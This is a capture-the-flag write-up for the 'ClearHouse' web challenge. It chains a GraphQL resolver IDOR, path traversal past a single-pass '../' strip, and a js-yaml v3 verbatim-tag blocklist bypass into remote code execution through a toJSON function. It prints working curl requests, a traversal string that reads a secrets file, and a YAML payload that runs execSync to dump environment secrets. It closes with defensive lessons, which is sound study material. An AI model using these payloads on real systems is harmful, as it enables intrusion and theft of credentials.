---
doc_kind: writeup
title: "ClearHouse - GraphQL IDOR to Path Traversal to js-yaml v3 toJSON RCE"
category: web
slug: clearhouse-graphql-idor-traversal-jsyaml-tojson-rce
created: 2026-10-25
status: solved
tags:
  - idor
  - graphql
  - path-traversal
  - js-yaml
  - unsafe-deserialization
  - tojson
  - rce
  - tag-blocklist-bypass
source: "battleCTF Qualifier 2026 (web, 142 pts)"
target: http://144.217.91.111:3004
---
# ClearHouse - GraphQL IDOR to Path Traversal to js-yaml v3 toJSON RCE

## Challenge Summary

- Source: battleCTF Qualifier 2026, challenge "ClearHouse" (id 29), Web, 142 pts (5 solves)
- Target: `http://144.217.91.111:3004` — Express 4.18.2 (Node 20) gateway behind openresty, talking to an internal `report-core` service (Node + js-yaml v3, reached over a small length-prefixed TCP protocol via `socat fork`, never directly reachable from the internet)
- Goal: Retrieve the flag, stored in `report-core`'s container environment (`FLAG=...`)

## Initial Signals

- Entry point: the challenge ships a `server.js` with comments stripped; the real, commented source is only recoverable later via the path-traversal bug.
- Visible hints: a seeded, never-directly-accessible `ops-internal` merchant account (`role: 'ops'`) and a pre-existing `payouts['1']` record owned by it — a strong signal that some endpoint leaks data belonging to other merchants' records.
- First confirming probe: the GraphQL schema's `createPayout` mutation accepts an arbitrary `correctsPayoutId`, and its `corrects` field resolver fetches that payout **without an ownership check**, while the resolved payout's nested `merchant` field exposes `apiKey`.

## Exploit Chain

1. **IDOR via a GraphQL field resolver (not the root query).** Root-level payout access may be guarded, but `createPayout(amount, correctsPayoutId:"1")` lets any registered user "correct" the seeded `ops-internal` payout (`id:"1"`) without any ownership check, and the `corrects { merchant { apiKey } }` selection on that mutation's response leaks `ops-internal`'s API key directly in the GraphQL response. This confirms a general lesson: ownership checks applied to a root query are often missing on a *field resolver* reachable via a different, less-obviously-related mutation.
2. **Path traversal via a single-pass `.replace()`.** `GET /ops/templates/download?name=...` builds the target path with `name.replace('../', '')` — which strips only the **first** occurrence of the literal substring, not all of them. Prefixing with enough repeated `../../../../../../../` segments (9 in practice) leaves enough un-stripped traversal to escape `TEMPLATE_DIR` entirely, reading arbitrary files as the gateway process: the real (commented) `server.js`, `utils/*.js`, and critically `config/internal-secrets.json`, which holds `reportCoreToken` (regenerated on every container start).
3. **`report-core` behavioral fingerprinting via differentiated errors.** `POST /ops/render-report` (gated by both the leaked `x-api-key` and `x-report-core-token`) forwards the raw request body to the internal `report-core` service. Probing with different inputs reveals the service's actual behavior through its distinct error responses: a YAML scalar/mapping echoes back as `JSON.stringify(yaml.load(body))` (byte-for-byte); an empty doc returns `undefined`; a parse error or array-root returns `400 invalid template`; any `!!js/...` tag returns `400 rejected: disallowed tag` (proving js-yaml's **unsafe v3 schema** is in use, with a custom blocklist bolted on); a cyclic/self-referencing YAML anchor returns `502 internal error` (a generic catch, and proof the output path really is `JSON.stringify`, since `JSON.stringify` throws on circular structures). ~8 hours were spent guessing at a "template" shape (field names like `template`/`data`/`name`/`html`, placeholder syntaxes) before realizing the service **never renders a template at all** — it only serializes whatever YAML it's given.
4. **Tag-blocklist bypass via the verbatim tag form.** The custom blocklist matches the literal string `!!js/`, but YAML allows writing the exact same tag in **verbatim URI form**: `!<tag:yaml.org,2002:js/function> "function(){ ... }"` (or equivalently a custom `%TAG` directive) — invisible to a naive substring/regex filter, and confirmed offline against `js-yaml@3.15.2` to still construct a real JS `Function` object.
5. **Triggering execution with no call site, via `toJSON`.** A constructed function object doesn't execute on its own — but `JSON.stringify()` calls `.toJSON()` on any object that has one, as part of normal serialization. Supplying an object whose `toJSON` property *is* one of these YAML-constructed functions means that function executes **during serialization itself**, with no explicit invocation needed anywhere in the vulnerable code:
   ```yaml
   a:
     toJSON: !<tag:yaml.org,2002:js/function> "function(){ return JSON.stringify(process.env) }"
   ```
   This alone dumped `process.env` (including `FLAG`) in the HTTP response. A follow-up payload used `process.mainModule.require('child_process').execSync(...)` (note: `new Function(...)`-constructed functions have no `require` in scope, so this indirection through `process.mainModule.require` is required for full command execution) to confirm full RCE as `uid=0(root)` inside the `report-core` container.

## Key Evidence

- `JSON.stringify(undefined)` → `undefined` in the response, and a cyclic-structure input triggering a generic `502 internal error`, together prove the render path really is `JSON.stringify(yaml.load(body))` rather than any templating engine — the decisive clue that redirected ~8 hours of failed "template shape guessing" toward the correct serialization-based exploit path.
- The `rejected: disallowed tag` error message for `!!js/...` tags simultaneously confirms (a) js-yaml v3's unsafe schema is active (only it recognizes JS-constructing tags at all) and (b) a blocklist exists specifically because that danger is real — a defensive error message that inadvertently documents the presence of the vulnerability it's trying to stop.
- `name.replace('../', '')` only removing the first occurrence was confirmed by successfully reading files with a sufficiently long repeated-`../` prefix.

## Dead Ends

- ~8 hours spent probing `report-core` with guessed template-shaped payloads (`template`, `data`, `name`, `html`, `receipt`, `report`, `{{...}}`/`<%= %>` placeholders, template file names/paths) — none triggered any rendering, because the service does not render templates at all; it only parses and re-serializes YAML. The real signal (differentiated error messages revealing `JSON.stringify` + a tag blocklist) was available from the very first probes but wasn't connected to "serialization gadget" thinking until much later.
- A rate limit (5 requests / 10 minutes, keyed on `req.ip`, shared across all players behind the same proxy since `trust proxy` isn't set) made brute-force-style probing of `report-core` expensive — the practical fix was converging multiple parallel workers onto a single probe at a time to maximize useful responses per rate-limit window, rather than spraying many different guesses per window.
- The challenge's source was patched mid-competition (memory-sweep logic added to `db.js`/`auth.js`) — the provided static attachment differed from the live server; always re-read live source via any available disclosure bug rather than trusting the downloadable attachment, especially for API keys/tokens that can "expire" after a redeploy.

## Payloads And Commands

```bash
# Step 1: GraphQL IDOR -> ops-internal apiKey
curl -s -X POST http://<target>/graphql \
  -H 'Content-Type: application/json' -H 'Authorization: Bearer <session>' \
  -d '{"query":"mutation($c:String){createPayout(amount:1,correctsPayoutId:$c){corrects{merchant{apiKey}}}}","variables":{"c":"1"}}'

# Step 2: path traversal (single .replace('../','') only strips one layer)
curl -s -G http://<target>/ops/templates/download \
  -H 'x-api-key: <ops_key>' \
  --data-urlencode 'name=../../../../../../../app/config/internal-secrets.json'
```

```yaml
# Step 3-4: tag-blocklist bypass (verbatim tag form) + toJSON RCE trigger
a:
  toJSON: !<tag:yaml.org,2002:js/function> "function(){ var r=''; try{ var cp=process.mainModule.require('child_process'); r+=cp.execSync('id; env', {encoding:'utf8', timeout:6000}); }catch(e){ r+='CPERR='+e.message; } return r }"
```

```bash
curl -s -X POST http://<target>/ops/render-report \
  -H 'Content-Type: text/plain' -H 'x-api-key: <ops_key>' -H 'x-report-core-token: <token>' \
  --data-binary @payload.yaml
```

## Flag / Outcome

- Flag: `CTF{3b44e1b49fddeb721f5aada24d90b082}`
- Confirmed full RCE as `uid=0(root)` inside the `report-core` container via `child_process.execSync`.

## Reusable Lessons

- When output comes from `JSON.stringify()` and an object has a `toJSON` method, that method is a free RCE trigger with no explicit call site — any gadget that can construct a function and assign it as an object's `toJSON` property turns an otherwise "just a serializer" sink into code execution.
- A blocklist that matches a literal tag string (`!!js/`) does not block the semantically identical **verbatim tag form** (`!<tag:yaml.org,2002:js/...>` or a custom `%TAG` directive) — any string-based YAML tag filter should be assumed bypassable this way.
- js-yaml v3's default (`yaml.load`) schema is unsafe and can construct JS functions/regexps from tagged scalars; treat any `yaml.load`-based service (as opposed to `safeLoad`/the js-yaml v4 default) as a deserialization RCE candidate first.
- Differentiated error messages (parse error vs. filter-rejected vs. generic internal error) map directly to distinct code branches — use them to identify the actual processing pipeline (parser vs. serializer vs. template engine) before guessing at payload *shapes*.
- IDOR checks applied only to a GraphQL root query can be missing on nested field resolvers reachable through a *different* mutation — always test "relation" fields (here, `corrects → merchant`), not just the obvious root-level object access.
- Don't persist on a single hypothesis (here, "it must be a template engine") for hours when the service's own error behavior is already pointing at a different mechanism (serialization) — re-derive the model from observed behavior rather than from the challenge's surface theme ("render-report").

## Pattern Candidates

- New pattern created: `knowledge/patterns/web/jsyaml-v3-verbatim-tag-tojson-rce.md`
